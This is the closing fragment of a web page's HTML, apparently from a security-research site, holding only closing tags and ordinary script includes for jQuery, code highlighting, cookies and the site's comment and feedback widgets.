
  </div>
</main>
</div>

<script type="text/javascript" src="/static/js/jquery.min.js"></script>
<script type="text/javascript" src="/static/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/static/js/index.js"></script>
<script type="text/javascript" src="/static/js/prism-loader.js"></script>
<script type="text/javascript" src="/static/js/prism.js"></script>
<script type="text/javascript" src="/static/js/jquery.ghostHunter.js"></script>
<script type="text/javascript" src="/static/js/js.cookie.js"></script>
<script type="text/javascript" src="/static/js/custom.js?t=20170821"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/comment_main.js"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/plugin_feedback.js"></script>
</body>

</html>
